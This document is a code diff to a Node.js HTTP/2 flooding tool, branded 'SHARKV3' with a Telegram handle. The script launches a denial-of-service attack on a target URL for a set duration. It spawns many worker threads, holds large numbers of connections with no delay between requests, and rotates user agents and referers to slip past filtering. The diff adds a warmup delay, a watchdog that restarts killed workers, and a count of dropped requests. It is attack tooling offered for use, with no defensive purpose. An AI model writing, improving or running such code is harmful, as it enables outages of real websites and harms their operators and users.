@@ -5,10 +5,7 @@ const readline = require('readline');
 const net = require('net');
 const fs = require('fs');
 
-// Load user agents from ua.txt
 const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);
-
-// Rotate referers to avoid bad sources
 const referers = [
     'https://www.google.com/',
     'https://www.bing.com/',
@@ -23,12 +20,14 @@ const INITIAL_CONNECTIONS = 45;
 const POWER_MULTIPLIER = 4;
 const MAX_INFLIGHT = 4000;
 const LIVE_REFRESH_RATE = 1100;
+const WARMUP_TIME = 10000; // 10 seconds
 
 let totalRequests = 0;
 let successCount = 0;
 let errorCount = 0;
 let maxRps = 0;
 let rpsLastSecond = 0;
+let vanishedCount = 0;
 
 if (isMainThread) {
     if (process.argv.length < 4) {
@@ -38,20 +37,40 @@ if (isMainThread) {
 
     const target = process.argv[2];
     const duration = parseInt(process.argv[3]);
+    const endTime = Date.now() + duration * 1000;
 
     console.clear();
     console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
-    console.log(`SHARKV3! - NO CPU WARMUP .exx`);
+    console.log(`SHARKV3! - WARMUP IN PROGRESS...`);
 
-    for (let i = 0; i < THREADS; i++) {
-        new Worker(__filename, { workerData: { target, duration, initial: true } });
+    const workers = [];
+
+    // Anti-kill watchdog
+    function spawnWorker(data) {
+        const w = new Worker(__filename, { workerData: data });
+        w.on('exit', code => {
+            if (Date.now() < endTime) {
+                console.log(`[ANTI-KILL] Restarting dead worker...`);
+                spawnWorker(data);
+            }
+        });
+        workers.push(w);
     }
 
-    for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
-        new Worker(__filename, { workerData: { target, duration, initial: false } });
-    }
+    setTimeout(() => {
+        console.clear();
+        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
+        console.log(`WARMUP COMPLETE. FULL THROTTLE.`);
 
-    // Live Stats
+        for (let i = 0; i < THREADS; i++) {
+            spawnWorker({ target, duration, initial: true });
+        }
+
+        for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
+            spawnWorker({ target, duration, initial: false });
+        }
+    }, WARMUP_TIME);
+
     setInterval(() => {
         maxRps = Math.max(maxRps, rpsLastSecond);
         renderStats();
@@ -68,6 +87,7 @@ if (isMainThread) {
         console.log(`===========================`);
         console.log(`succes: ${successCount}`);
         console.log(`Blocked: ${errorCount}`);
+        console.log(`Vape: ${vanishedCount}`);
     }
 
     const server = net.createServer(socket => {
@@ -76,6 +96,7 @@ if (isMainThread) {
             if (msg === 'req') totalRequests++, rpsLastSecond++;
             else if (msg === 'ok') successCount++;
             else if (msg === 'err') errorCount++;
+            else if (msg === 'vanish') vanishedCount++;
         });
     });
     server.listen(9999);
@@ -83,7 +104,6 @@ if (isMainThread) {
     const { target, duration, initial } = workerData;
     const connections = initial ? INITIAL_CONNECTIONS : INITIAL_CONNECTIONS * POWER_MULTIPLIER;
     const end = Date.now() + duration * 1000;
-
     const socket = net.connect(9999, '127.0.0.1');
     const sendStat = msg => socket.write(msg);
 
@@ -101,16 +121,23 @@ if (isMainThread) {
                 };
                 const req = client.request(headers);
 
+                let sent = false;
                 req.setEncoding('utf8');
-                req.on('data', () => {}); // consume data to ensure request completion
                 req.on('response', () => {
+                    sent = true;
                     inflight.count--;
                     sendStat('ok');
                 });
-
+                req.on('data', () => {}); // consume
                 req.on('error', () => {
                     inflight.count--;
                     sendStat('err');
+                });
+                req.on('close', () => {
+                    if (!sent) {
+                        inflight.count--;
+                        sendStat('vanish');
+                    }
                 });
 
                 req.end();
@@ -121,7 +148,7 @@ if (isMainThread) {
             }
         }
 
-        setTimeout(() => sendLoop(client, inflight), 0); // no delay between calls
+        setTimeout(() => sendLoop(client, inflight), 0);
     }
 
     function createConnection() {
@@ -135,14 +162,14 @@ if (isMainThread) {
 
             client.on('error', () => {
                 client.destroy();
-                setTimeout(createConnection, 100); // auto-recover fast
+                setTimeout(createConnection, 100);
             });
 
             client.on('goaway', () => client.close());
             client.on('close', () => setTimeout(createConnection, 100));
 
             client.on('connect', () => {
-                for (let i = 0; i < 150; i++) sendLoop(client, inflight); // boosted request flow
+                for (let i = 0; i < 150; i++) sendLoop(client, inflight);
             });
         } catch {
             setTimeout(createConnection, 100);
